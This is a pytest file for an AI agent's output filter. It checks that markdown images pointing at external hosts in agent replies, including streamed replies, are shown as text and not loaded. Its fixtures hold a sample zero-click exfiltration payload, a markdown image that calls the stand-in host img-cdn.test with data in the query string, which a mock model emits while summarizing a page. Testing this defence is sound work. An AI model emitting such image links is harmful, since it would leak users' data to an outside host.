"""Remote images in replies are shown as text (zero-click exfiltration via the UI's image loading)."""
from __future__ import annotations

import os
import tempfile
from unittest.mock import patch

import pytest

os.environ.setdefault("DATA_DIR", tempfile.mkdtemp(prefix="pantheon-tests-"))

from agent.output_filter import ImageFilter, sanitize  # noqa: E402

EXFIL = "Done.\n![map](https://img-cdn.test/pixel.png?u=alarm%204826)"


def test_external_images_become_text():
    out = sanitize(EXFIL)
    assert "img-cdn.test/pixel" not in out and "image not shown: map" in out and "img-cdn.test" in out


def test_internal_and_user_given_images_stay():
    assert sanitize("![chart](/api/artifacts/a1/raw)") == "![chart](/api/artifacts/a1/raw)"
    u = "https://example.org/diagram.png"
    assert sanitize(f"![d]({u})", {u}) == f"![d]({u})"
    assert sanitize("[a link](https://x.test)") == "[a link](https://x.test)"     # links untouched


@pytest.mark.parametrize("chunks", [
    ["Done.\n![ma", "p](https://img-cdn.te", "st/pixel.png?u=alarm%204826)"],
    ["Done.\n!", "[map](https://img-cdn.test/pixel.png?u=alarm%204826)"],
    [EXFIL],
])
def test_streaming_never_emits_the_image(chunks):
    f = ImageFilter()
    out = "".join(f.feed(c) for c in chunks) + f.flush()
    assert "pixel.png" not in out and out.startswith("Done.") and "image not shown" in out


def test_streaming_passes_ordinary_text_and_bangs():
    f = ImageFilter()
    out = "".join(f.feed(c) for c in ["Wow!", " [see this](https://a.test)", " ok!"]) + f.flush()
    assert out == "Wow! [see this](https://a.test) ok!"


class _Prov:
    model, task_class = "m", "agent"

    async def chat(self, messages, tools=None, stream=True, **kw):
        for c in ["Lisbon in 48h.\n![ma", "p](https://img-cdn.test/pixel.png?u=NOTES)"]:
            yield {"type": "text_delta", "content": c}
        yield {"type": "done"}


@pytest.mark.asyncio
async def test_agent_reply_is_filtered_end_to_end():
    from agent.core import AgentCore
    from config import get_settings
    agent = AgentCore(provider=_Prov(), memory_manager=None, project_id="p", session_id="s")
    with patch.object(get_settings(), "agent_force_search", False), patch("agent.core.get_all_tool_schemas", return_value=[]), \
         patch("agent.core.build_system_prompt", return_value="sys"):
        evs = [e async for e in agent.chat("Summarize this page")]
    streamed = "".join(e["content"] for e in evs if e["type"] == "text_delta")
    done = next(e for e in evs if e["type"] == "done")["full_response"]
    for text in (streamed, done, agent.working_memory[-1]["content"]):
        assert "pixel.png" not in text and "image not shown" in text
